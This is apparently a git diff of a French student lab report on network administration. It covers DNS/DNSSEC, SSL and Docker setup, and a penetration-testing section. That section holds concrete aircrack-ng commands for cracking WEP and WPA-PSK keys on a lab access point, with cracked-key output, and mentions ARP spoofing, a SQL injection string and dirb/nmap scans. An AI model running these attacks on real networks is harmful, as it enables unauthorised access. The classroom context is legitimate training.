@@ -28,6 +28,7 @@
   * [Configuration DNSSEC](#configuration-dnssec)
   * [Sécurisation des données](#sécurisation-des-données)
   * [Chiffrement des données](#chiffrement-des-données)
+  * [Ferme de serveurs Web](#ferme-de-serveurs-web)
 * [Tests d'intrusion](#tests-dintrusion)
   * [Cassage de clef WEP d'un point d'accès Wifi](#cassage-de-clef-wep-dun-point-daccès-wifi)
   * [Cassage du mot de passe WPA-PSK par force brute](#cassage-du-mot-de-passe-wpa-psk-par-force-brute)
@@ -940,10 +941,16 @@ SE2A5-AP2(config-if)#exit
 
 ## Création de la machine virtuelle
 
-* Connexion au serveur Capbreton:
+* Connexion au serveur Capbreton :
 ```
 ssh capbreton.plil.info
 ```
+
+* Créer la variable d'environnement `http_proxy` :
+```
+export http_proxy=http://proxy.plil.fr:3128
+```
+En configurant correctement le proxy de la plateforme, il est désormais possible d'accéder aux images et aux paquets Debian pour créer la VM. 
 
 * Création d’une image pour la VM :
 ```
@@ -1113,6 +1120,14 @@ iface eth0 inet static
 
 ## Serveur DNS
 
+Dans un premier temps, on utilise le registrar [Gandi](gandi.net) afin de réserver le nom de domaine `demineur.site`.  
+Une fois le nom de domaine réservé, il est alors possible de configurer les serveurs de noms, les Glue Records et les enregistrements DNS :  
+&ensp; &rarr; Ajouter le Glue Record vers `193.48.57.164` afin d'associer le nom de domaine `demineur.site` à l'adresse IP `193.48.57.164`  
+&ensp; &rarr; Modifier les serveurs de noms pour utiliser `ns.demineur.site` et `ns6.gandi.net`  
+&ensp; &rarr; Modifier l'enrgistrement DNS `@`-`A` avec la valeur `193.48.57.193`  
+&ensp; &rarr; Ajouter l'enrgistrement DNS `ns`-`A` avec la valeur `193.48.57.193`  
+&ensp; &rarr; Modifier l'enrgistrement DNS `www`-`CNAME` avec la valeur `ns.demineur.site.`
+
 * Installation du paquet `bind9`
 ```
 apt install bind9
@@ -1125,10 +1140,10 @@ nameserver 127.0.0.1
 
 * Modification du fichier `/etc/bind/named.conf.local` :
 ```
-zone "demineur.site" {
+zone "demineur.site" IN {
 	type master;
-file "/etc/bind/db.demineur.site";
-allow-transfer { 10.60.100.254; };
+	file "/etc/bind/db.demineur.site";
+	allow-transfer { 8.8.8.8; 8.8.4.4; };
 };
 ```
 
@@ -1137,18 +1152,19 @@ allow-transfer { 10.60.100.254; };
 options{
   directory "/var/cache/bind";
   forwarders {
-     10.60.100.254;
      8.8.8.8;
+     8.8.4.4;
   };
-  dnssec-validation auto;
   listen-on-v6 { any; };
   allow-transfer { "allowed_to_transfer"; };
 };
 acl "allowed_to_transfer" {
-  217.70.177.40/32 ;
+  8.8.8.8/32 ;
+  8.8.4.4/32 ;
 };
 ```
 
+* Créer le fichier BIND pour `demineur.site` :
 ```
 cp /etc/bind/db.local /etc/bind/db.demineur.site
 ```
@@ -1167,10 +1183,10 @@ $TTL    604800
                          604800 )       ; Negative Cache TTL
 ;
 @       IN      NS      ns.demineur.site.
-@       IN      A       193.48.57.164
-@       IN      AAAA    ::1
+@       IN      NS      ns6.gandi.net.
 ns      IN      A       193.48.57.164
-www     IN      A       193.48.57.164
+ns      IN      AAAA    2001:7A8:116E:60A4::1
+www     IN      CNAME   193.48.57.164
 ```
 
 * Redémarrage du service `bind9` :
@@ -1201,13 +1217,24 @@ apt install openssl
 ```
 openssl req -nodes -newkey rsa:2048 -sha256 -keyout demineur.site.key -out demineur.site.csr
 ```
+Attention à bien renseigner `demineur.site` comme CN (Common Name) pour la création du certificat.
 
 ```
 mv demineur.site.key /etc/ssl/private
 mv demineur.site.csr /etc/ssl/certs
 ```
 
-Faire signer le certificat `demineur.site.csr` par un registrar tel que [Let's Encrypt](https://letsencrypt.org/fr/) ou [Gandi](https://docs.gandi.net/fr/ssl/creation/installation_certif_manuelle.html) et placer le nouveau certificat (.crt) dans le répertoire `/etc/ssl/certs`. Télécharger également le certificat nommé `GandiStandardSSLCA2.pem` et le placer dans le même dossier.
+Il est nécessaire de faire signer le certificat `.csr` par un registrar tel que [Let's Encrypt](https://letsencrypt.org/fr/) ou [Gandi](https://docs.gandi.net/fr/ssl/creation/installation_certif_manuelle.html) afin d'en obtenir le nouveau certificat signé `.crt`.  
+Puisque le registrar Gandi a été utilisé pour réserver le nom de domaine `demineur.site`, il est alors possible d'utiliser à nouveau ce service pour signer gratuitement le certificat `demineur.site.csr`.  
+Pour cela, il faut "acheter" un certificat SSL pour un hôte "ailleurs" et coller le contenu du fichier `.csr`. Une fois le CN entré et reconnu, l'achat devient gratuit et peut être effectué.  
+Après quelques minutes, il est désormais possible de télécharger le certificat signé `.crt` ainsi que le certificat nommé `GandiStandardSSLCA2.pem`.  
+Ces deux certificats sont à copier dans le répertoire `/etc/ssl/certs` de la VM.
+
+* Copier les certificats sur la VM :
+```
+scp -r -p demineur.site.crt root@193.48.57.164:/etc/ssl/certs
+scp -r -p GandiStandardSSLCA2.pem root@193.48.57.164:/etc/ssl/certs
+```
 
 * Installation du paquet `apache2` :
 ```
@@ -1318,11 +1345,28 @@ dnssec-signzone -o demineur.site -k demineur.site-ksk ../db.demineur.site demine
 ```
 zone "demineur.site" {
 	type master;
-file "/etc/bind/db.demineur.site.signed";
-allow-transfer { 10.60.100.254; };
+	file "/etc/bind/db.demineur.site.signed";
+	allow-transfer { 8.8.8.8; 8.8.4.4; };
 };
 ```
 
+* Modification du fichier `/etc/bind/named.conf.options` :
+````
+options{
+  directory "/var/cache/bind";
+  forwarders {
+     8.8.8.8;
+     8.8.4.4;
+  };
+  dnssec-validation auto;
+  listen-on-v6 { any; };
+  allow-transfer { "allowed_to_transfer"; };
+};
+acl "allowed_to_transfer" {
+  8.8.8.8/32 ;
+  8.8.4.4/32 ;
+};
+```
 Il ne reste plus qu’à communiquer la partie publique de la KSK (présente dans le fichier demineur.site-ksk.key) à Gandi. L'algorithme utilisé est le 5 (RSA/SHA-1).
 
 ### Vérification :
@@ -1418,48 +1462,94 @@ umount /mnt
 crytsetup luksClose home
 ```
 
+## Ferme de serveurs Web
+
+* Installer Docker :
+```
+sudo apt install docker
+```
+
+* Créer un fichier de configuration `Dockerfile` :
+```
+FROM httpd:latest
+WORKDIR /usr/local/apache2/htdocs 
+COPY src/ .
+CMD [ "httpd", "-D", "FOREGROUND" ]
+```
+
+* Créer l'image Docker :
+```
+docker build -t apache .
+```
+
+* Créer un conteneur :
+```
+docker run -d --name apache apache
+```
+
 # Tests d'intrusion
 
-## Cassage de clef WEP d'un point d'accès Wifi
+* Passer en mode super-utilisateur :
+```
+su -
+```
+Le paramètre `-` permet de lire le fichier `.bashrc` de l'utilisateur `root` et d'ajouter le répertoire `/sbin` à la variable d'environnement `PATH`. Cela permet donc d'accéder aux multiples commandes du paquet `aircrack-ng`. 
 
 * Installation des paquets nécessaires :
 ```
-sudo apt-get install aircrack-ng pciutils
+apt install aircrack-ng pciutils crunch
 ```
+
+## Cassage de clef WEP d'un point d'accès Wifi
 
 * Vérification du nom de la carte Wifi :
 ```
-sudo airmon-ng
+airmon-ng
+```
+La carte Wifi se nomme `wlan0mon`.
+
+* Démarrer la carte Wifi en mode de surveillance (monitor mode) :
+```
+sudo airmon-ng start wlan0mon
 ```
 
-* Démarrer le mode de surveillance (monitor mode) sur la carte Wifi :
+* Lancer une écoute de tout les paquets Wifi qui circulent afin de déterminer les paramètres du réseau à attaquer :
 ```
-sudo airmon-ng start {Nom carte Wifi}
+sudo airodump-ng wlan0mon
 ```
+Récupérer les informations suivantes :  
+&ensp; &rarr; BSSID	- 04:DA:D2:9C:50:53  
+&ensp; &rarr; Canal	- 3  
+&ensp; &rarr; SSID	- cracotte04
 
-* Lancer une écoute de tout les paquets Wifi qui circulent :
+* Réaliser un test d'injection sur le point d'accès pour vérifier que la distance entre la carte Wifi et le point d'accès est suffisante :
 ```
-sudo airodump-ng {Nom carte Wifi}
+sudo aireplay-ng -9 -e cracotte04 -a 04:DA:D2:9C:50:53 wlan0mon
 ```
+La commande doit retourner un pourcentage proche de 100% pour réaliser l'opération.
 
-* Réaliser un test d'injection sur le point d'accès :
-```
-sudo aireplay-ng -9 -e {SSID} -a {MAC point d'accès} {Nom carte Wifi}
-```
+Il faut désormais lancer deux opérations en parallèle :  
+&ensp; &rarr; Cibler le point d'accès avec `airodump-ng` pour capturer les vecteurs d'initialisation nécessaires au cassage de la clef WEP  
+&ensp; &rarr; Associer la carte Wifi et le point d'accès avec `aireplay-ng`
 
-* Récupérer les vecteurs d'initialisation pour l'algorithme de cassage :
+* Récupérer les vecteurs d'initialisation (VI) pour l'algorithme de cassage :
 ```
-sudo airodump-ng -c {Canal Wifi} --bssid {MAC point d'accès} -w output {Nom carte Wifi}
+sudo airodump-ng -c 3 --bssid 04:DA:D2:9C:50:53 -w output wlan0mon
 ```
+Les VI générés sont enregistrés dans les fichiers `output*`
 
 * Associer la carte Wifi et le point d'accès :
 ```
-sudo aireplay-ng -1 0 -e {SSID} -a {MAC point d'accès} -h {MAC carte Wifi} {Nom carte Wifi}
+sudo aireplay-ng -1 0 -e cracotte04 -a 04:DA:D2:9C:50:53 -h {MAC carte Wifi} wlan0mon
 ```
+Le paramètre `-1` permet d'effectuer de fausses authentifications dont le délai entre les demandes est `0`.  
+Pour cela, il est nécessaire de spécifier le BSSID de la carte Wifi utilisée pour le cassage.
+
+Après un certain temps, un nombre suffisant de VI a été capturé et la clef WEP peut alors être cassée à l'aide des fichiers `output*`.
 
 * Casser la clef WEP du point d'accès :
 ```
-sudo aircrack-ng -b {MAC point d'accès} output*.cap
+sudo aircrack-ng -b 04:DA:D2:9C:50:53 output*.cap
 ```
 
 ```
@@ -1469,36 +1559,55 @@ Decrypted correctly: 100%
 
 ## Cassage du mot de passe WPA-PSK par force brute
 
-* Installation des paquets nécessaires :
+* Vérification du nom de la carte Wifi :
 ```
-sudo apt-get install aircrack-ng pciutils crunch
+airmon-ng
+```
+La carte Wifi se nomme `wlan0mon`.
+
+* Démarrer la carte Wifi en mode de surveillance (monitor mode) :
+```
+sudo airmon-ng start wlan0mon
 ```
 
-* Démarrer le mode de surveillance (monitor mode) sur la carte Wifi :
+* Lancer une écoute de tout les paquets Wifi qui circulent afin de déterminer les paramètres du réseau à attaquer :
 ```
-sudo airmon-ng start {Nom carte Wifi}
+sudo airodump-ng wlan0mon
 ```
+Récupérer les informations suivantes :  
+&ensp; &rarr; BSSID	- :::::  
+&ensp; &rarr; Canal	-   
+&ensp; &rarr; SSID	- 
 
-* Lancer une écoute de tous les paquets Wifi qui circulent :
+* Cibler la recherche vers le point d'accès pour capturer les VI générés par le PA :
 ```
-sudo airodump-ng {Nom carte Wifi}
+airodump-ng -c {Canal Wifi} --bssid {MAC point d'accès} -w psk wlan0mon
 ```
-
-* Cibler la recherche vers le point d'accès :
-```
-sudo airodump-ng -c {Canal Wifi} --bssid {MAC point d'accès} -w psk {Nom carte Wifi}
-```
-
-Il faut attendre de récupérer les données issues d'un handshake (émis lors de la connexion d'un utilisateur au PA).
+Il est nécessaire de capturer les VI issus d'un handshake (émis lors de la connexion d'un utilisateur au PA).  
+Pour cela, des cartes Raspberry Pi présentes dans la salle de TP se connectent aux différents réseaux Wifi WPA.  
+Ici, les paquets récupérés sont stockés dans des fichiers `psk*`.
 
 * Créer un dictionnaire de toutes les combinaisons décimales possibles sur 8 bits :
 ```
-sudo crunch 8 8 0123456789 -o dictionnaire
+crunch 8 8 0123456789 -o dictionnaire
 ```
 
 * Cassage de la PSK :
 ```
-sudo aircrack-ng -w dictionnaire -b {MAC point d'accès} psk*.cap
+aircrack-ng -w dictionnaire -b {MAC point d'accès} psk*.cap
+```
+
+```
+KEY FOUND! [ 90122222 ]
+Master Key     : 2D 1E 30 8D AA 30 91 7A 5D AB B5 80 02 FB 16 3F 
+                 9B DB 91 AC A5 76 4A 33 31 8B D3 7B AC 5A DB A7 
+
+Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+EAPOL HMAC     : E6 17 FE C7 E3 14 F0 B9 68 99 97 86 07 41 DA E8
 ```
 
 ## Attaque du type "homme du milieu" par usurpation ARP
@@ -1507,7 +1616,7 @@ Sur la machine qui effectue l'attaque :
 
 * Activer le routage IPv4 :
 ```
-sudo sysctl -w net.ipv4.ip_forward=1
+sysctl -w net.ipv4.ip_forward=1
 ```
 
 * Lancer l'empoisonnement du cache ARP de la victime :
@@ -1545,7 +1654,7 @@ SELECT * FROM USERS WHERE ID='' OR 1 = 1 --' AND PWD='' OR 1 = 1 --'
 
 * Installation des paquets nécessaires :
 ```
-sudo apt-get install dirb
+apt-get install dirb
 ```
 
 * Analyse des fichiers du serveur Web :
@@ -1561,7 +1670,7 @@ On remarque la présence du répertoire `phpmyadmin` sur le serveur.
 
 * Installation des paquets nécessaires :
 ```
-sudo apt-get install nmap
+apt-get install nmap
 ```
 
 * Vérifier que le serveur est accessible à distance (analyse des ports) :
@@ -1656,12 +1765,18 @@ sed -i 's/\(.*\)/\1\1/' dico
 * Début configuration ISR 4331
 * Création VM
   * Partitions virtuelles
-  * LAMP
+  * Apache + SSL
   * DNS
+  * RAID5
 
 ## Jeudi 18/11/2021 08h-10h
 
 **Tâches effectuées :**
+* Configuration de la VM
+  * Configuration DNS avec Gandi fonctionnelle
+  * Création du certificat SSL
+  * Activation du site HTTPS
+* Tests du craquage de clef WEP
 
 ## Vendredi 19/11/2021 08h-12h
 
